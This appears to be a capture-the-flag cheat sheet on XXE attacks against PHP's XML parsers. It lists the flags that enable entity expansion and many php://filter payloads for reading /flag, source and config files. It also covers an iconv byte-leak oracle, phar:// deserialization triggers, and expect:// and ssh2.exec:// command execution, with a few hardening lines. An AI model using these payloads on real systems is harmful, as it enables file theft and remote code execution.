# PHP-Specific XXE — the `php://` family deep

## The PHP-parser landscape — `simplexml`/`DOMDocument`/`XMLReader`

PHP's XML libs wrap libxml2 — the `LIBXML_*` flags control behavior —
the flags are PHP-level constants passed to `loadXML`/`load`/constructors.

## The `LIBXML_NOENT` switch — the PHP XXE config

```php
$d = new DOMDocument();
$d->loadXML($xml);                    // external entities DON'T expand
$d->loadXML($xml, LIBXML_NOENT);      // external entities EXPAND
$d->substituteEntities = true;        // same as NOENT
```

`LIBXML_NOENT` = "substitute entities" = the external-entity expansion
switch — PHP XXE needs it on — the verified card's name `simplexml-noent`
records exactly this.

## The `simplexml` path — `simplexml_load_string`

```php
simplexml_load_string($xml);                         // no flags
simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
new SimpleXMLElement($xml, LIBXML_NOENT);
```

The third arg is the flags — `LIBXML_NOENT` enables external-entity
expansion.

## The `XMLReader` path — `setParserProperty`

```php
$r = new XMLReader();
$r->XML($xml);
$r->setParserProperty(XMLReader::SUBST_ENTITIES, true);
```

`XMLReader::SUBST_ENTITIES` — the property equivalent.

## The `xml_parse`/`expat` path — the other engine

```php
$p = xml_parser_create();
xml_set_external_entity_ref_handler($p, 'handler');
xml_parse($p, $xml);
```

expat — `xml_set_external_entity_ref_handler` — a custom resolver —
external entities fire the handler — the handler is code.

## `libxml_set_external_entity_loader` — the global resolver

```php
libxml_set_external_entity_loader(function($pub,$sys,$ctx){ return null; });
```

A PHP-level resolver — the "set to null" pattern kills external loads —
the hardening line to look for.

## `libxml_disable_entity_loader` — the deprecated switch

```php
libxml_disable_entity_loader(true);   // deprecated PHP8 — disables loaders
```

Pre-PHP8 — a global kill-switch — deprecated in PHP8 (entity-loader
default is now null unless `LIBXML_NOENT`).

## The `php://filter` family — the PHP-stream engine

```
php://filter/<filter>/resource=<path>
php://filter/read=<f1>|<f2>/resource=<path>
php://filter/write=<f1>|<f2>/resource=<path>
```

The `read=`/`write=` chain — multiple `|`-separated filters — the
transform engine.

### `convert.base64-encode` — the safe read

```php
php://filter/convert.base64-encode/resource=/flag
php://filter/convert.base64-encode/resource=index.php
```

b64 the content — XML-safe — the binary-safe read.

### `convert.iconv` — the charset-oracle

```php
php://filter/convert.iconv.utf-8.utf-16/resource=/flag
php://filter/convert.iconv.ucs-4le.ucs-4/resource=/flag
php://filter/convert.iconv.CP1251.UTF-16/resource=/flag
```

Charset transforms — the output byte-length varies with content — the
byte-leak oracle — `web-sqli`'s `filter-chain-oracle` applies the same.

### `zlib.deflate`/`zlib.inflate` — the compression

```php
php://filter/zlib.deflate/resource=/flag            — raw deflate
php://filter/zlib.deflate/convert.base64-encode/resource=/flag  — deflate+b64
php://filter/zlib.inflate/resource=/x.gz            — inflate a gz file
```

### `string.rot13`/`string.strip_tags`/`string.toupper` — the string filters

```php
php://filter/string.rot13/resource=/flag
php://filter/string.strip_tags/resource=/flag
php://filter/string.toupper/resource=/flag
```

### `convert.quoted-printable-encode`/`convert.uuencode`

```php
php://filter/convert.quoted-printable-encode/resource=/flag
php://filter/convert.uuencode/resource=/flag
```

### `convert.base64-decode` — the decode

```php
php://filter/convert.base64-decode/resource=/x.b64
```

## `php://input`/`php://stdin` — the body-as-file

```
php://input             — the request body
php://stdin             — stdin
php://filter/convert.base64-encode/resource=php://input
```

`php://input` is the request-body — the entity's "file" is the request
itself — a self-referential read.

## `php://fd/N` — the open-fd read

```
php://fd/0 php://fd/3 php://fd/4 ...
```

PHP's fd-children — the PHP process's open files — `/proc/self/fd/N`
equivalent.

## `phar://` — the deser-trigger

```
phar:///path/x.phar/a
```

`phar://` access unserializes phar-metadata — a `file-upload`-placed
phar + an XXE `phar://` reference = the deser-trigger — the XXE-as-
trigger chain — `web-deserialization`.

## `expect://` — the PECL exec

```
expect://id
expect://cat%20/flag
```

`expect` extension — `expect://<cmd>` runs the command — direct exec —
`xxe-to-rce.md`.

## `ssh2://`/`rar://`/`ogg://`/`compress.*` — the other stream-wrappers

```
ssh2.exec://user:pass@host/cmd
ssh2.sftp://user:pass@host/path
rar://archive.rar#file
ogg://x.ogg
compress.zlib://x.gz
compress.bzip2://x.bz2
```

PHP's full wrapper-list — `ssh2`/`rar`/`ogg`/`compress.*` — extension-
dependent — `ssh2.exec://` = remote-exec if the ssh2 ext exists.

## The `libxml`-specific quirks — PHP's own

- `LIBXML_NOENT` — the expansion switch
- `LIBXML_DTDLOAD` — load external DTD
- `LIBXML_DTDATTR` — apply DTD defaults
- `LIBXML_DTDVALID` — validate
- `LIBXML_NONET` — no network fetches — kills `http:`/`ftp:` but not
  `file:`
- `LIBXML_PARSEHUGE` — uncap entity-expansion
- `LIBXML_NOCDATA` — CDATA-as-text
- `LIBXML_COMPACT`/`LIBXML_NOBLANKS`/`LIBXML_NOEMPTYTAG` — formatting

`LIBXML_NONET` — the interesting one — `file:`-reads still work,
`http:`-fetches dead — the "local-entities live, network dead" config.

## The PHP-error fingerprint — `libxml` warnings

```
Warning: DOMDocument::loadXML(): failed to load external entity "..."
Warning: simplexml_load_string(): I/O warning : failed to load external entity
Warning: XMLReader::read(): ...
```

`libxml` in the warning = PHP — the warning's URI carries the exfil.

## The "the flag is `getenv('FLAG')`" — the PHP-flag shape

PHP-flag challenges set `FLAG` via docker-env — `getenv('FLAG')` reads
it — `file:///proc/self/environ`/`/proc/1/environ` — the env-read.

## The "the flag is a PHP constant" — `define('FLAG',...)`

```php
define('FLAG', 'flag{...}');
```

In `config.php`/`flag.php` — `file:///var/www/html/config.php` reads it.

## The "the flag is `include`-d" — the include-chain

`index.php` → `require 'flag.php'` → `flag.php` has the flag —
`file:///var/www/html/flag.php` — the include-chain read.
